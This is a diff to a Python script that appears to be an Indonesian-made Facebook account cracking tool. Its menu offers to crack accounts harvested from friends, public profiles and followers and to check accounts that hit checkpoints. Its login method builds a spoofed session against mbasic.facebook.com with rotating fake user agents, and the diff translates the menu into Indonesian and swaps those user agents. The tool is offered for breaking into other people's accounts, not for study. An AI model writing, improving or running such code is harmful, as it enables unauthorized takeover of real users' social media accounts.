@@ -302,15 +302,15 @@ def cracking_menu():
 	print   '\033[0;97m┌'+48*'─'+ '┐'
 	print("├               ├ Cracking Menu ┤	         ┤")
 	print("├               └───────────────┘                ┤")
-	print("├ [01] Crack From Friends                        ┤")
-	print("├ [02] Crack From Public                         ┤")
-	print("├ [03] Crack From Followers                      ┤")
-	print("├ [04] Crack From Public Followers               ┤")
-	print("├ [05] Crack From File Name                      ┤")
-	print("├ [06] Check Cracked Checkpoint Accounts         ┤")
+	print("├ [01] Crack Dari Teman                        ┤")
+	print("├ [02] Crack Dari Public                         ┤")
+	print("├ [03] Crack Dari Followers                      ┤")
+	print("├ [04] Crack Dari Public Followers               ┤")
+	print("├ [05] Crack Dari File Name                      ┤")
+	print("├ [06] Check Akun Hasil Chekpoin         ┤")
 	print("├ [07] Facebook Username Becomes IDz             ┤")
-	print("├ [08] Logout From Facebook                      ┤")
-	print("├ [eE] Exit Program                              ┤")
+	print("├ [08] Logout Akun Facebook                      ┤")
+	print("├ [eE] Keluar Program                              ┤")
 	print   '\033[0;97m└'+48*'─'+ '┘'
 	zk = raw_input("\n \033[0;97m [\033[0;97m➣\033[0;97m] Choose An Option: ")
 	if zk =="":
@@ -732,7 +732,7 @@ def relogin():
 
 def method(user, pasw):
 	mb = ("https://mbasic.facebook.com")
-	ua15 ="Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en-US) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.701 Mobile Safari/534.8+"
+	ua15 ="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9"
 	ua14 ="Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 640 LTE) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586"
 	ua13 ="Mozilla/5.0 (Linux; Android 10; Mi 9T Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 OPR/63.3.3216.58675"
 	ua1 ="Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.14977"
@@ -746,7 +746,7 @@ def method(user, pasw):
 	ua4="Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 625) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537"
 	ua3 ="Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 640 LTE) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586"
 	ua2 ="Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/2.0; Touch; rv: 10.0; IEMobile/11.0; NOKIA; Lumia 635) AppleWebKit/537 KHTML, like Gecko) Mobile Safari/537"
-	ua = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'])
+	ua = random.choice(['Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'])
 	ses = requests.Session()
 	# kntl bapackkau pecah
 	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
